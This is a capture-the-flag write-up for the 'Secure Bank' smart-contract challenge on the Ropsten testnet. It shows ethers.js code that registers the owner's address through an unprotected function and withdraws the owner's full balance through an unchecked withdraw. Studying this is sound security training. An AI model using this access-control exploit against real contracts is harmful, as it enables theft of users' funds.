# Secure Bank

# Problem Statement
```
Game Balance: 0.4 ETH

Good Afternoon!
Welcome to your Super Secure Digital Bank Account.
You may have heard elsewhere that with blockchain, banks are a thing of the past, what with fully owning your private keys and all...

But that is nonesense! You still need a bank! Who else will send you 30 new credit card offers in the mail each day??

At Super Secure Bank, we bring you the best of both worlds! We let you control the keys to your funds (stored in our smart contract) while still requiring you to register and receive our spam!

Register Today!
---------------
|Email |      |
---------------
|Register|
----------
```

# Solution
Again, lets first look at all the `public`/`external` methods we can call. After looking at all all of these externally callable functions, we spot a possible vulnerability with the `SimpleBank` `withdraw` function:
```
// using ethers.js
function withdraw(address _user, uint256 _value) public ctf{
  require(_value<=balances[_user], "Insufficient Balance");
  balances[_user] -= _value;
  msg.sender.transfer(_value);
}
```
This function allows any caller to withdraw a `_value` amount of ethereum if the `_user` exists in the `balances` map.<br>
Because `MembersBank` inherits from `SimpleBank` it overrides the `withdraw` function but will call it anyway in the function body:
```
function withdraw(address _user, uint256 _value) public isMember(_user) ctf{
  super.withdraw(_user, _value);
}
```
Lets get the contract owner's address so we can check the balance. You can get this by going to https://ropsten.etherscan.io/address/CONTRACT_ADDRESS and the `From` field value is the address of the owner.
```
const contractAddress = // Secure Bank contract address
const ownerAddress = // From going to etherscan above
const abi = [
  {
    constant: true,
    inputs: [{ name: "", type: "address" }],
    name: "balances",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];
const contract = new ethers.Contract(contractAddress, abi, eoa);
const getResult = await contract.balances(ownerAddress);
console.log("getResult: ", getResult);
// returns BigNumber { value: "400000000000000000" }
```
So we just need to call this function to exploit this vulnerability. To do this we have to make sure we can pass the `isMember` modifier so lets call the `register` function with the owner's address:
```
const contractAddress = // Secure Bank contract address
const ownerAddress = // From going to etherscan above
const abi = [
  {
    constant: false,
    inputs: [
      { name: "_user", type: "address" },
      { name: "_username", type: "string" },
    ],
    name: "register",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];
const contract = new ethers.Contract(contractAddress, abi, eoa);
const tx = await contract.register(ownerAddress, "owner");
```
Next, lets see how ethereum exists in the contract:
```
const contractAddress = // Secure Bank contract address
const contractEtherBalance = await provider.getBalance(contractAddress);
console.log(contractEtherBalance);
// returns BigNumber { value: "400000000000000000" }
```
Ok, so the owner has all of the ethereum stored in the contract.<br>
Lets now run the `withdraw` method with the owner's account and with the ethereum balance:
```
const contractAddress = // Secure Bank contract address
const ownerAddress = // From going to etherscan above
const abi = [
  {
    constant: false,
    inputs: [
      { name: "_user", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "withdraw",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];
const contract = new ethers.Contract(contractAddress, abi, eoa);
const tx = await contract.withdraw(ownerAddress, "400000000000000000");
```

We've completed this lesson!

# Key Learnings
- When working with contracts that require authorization make sure all access points are protected.
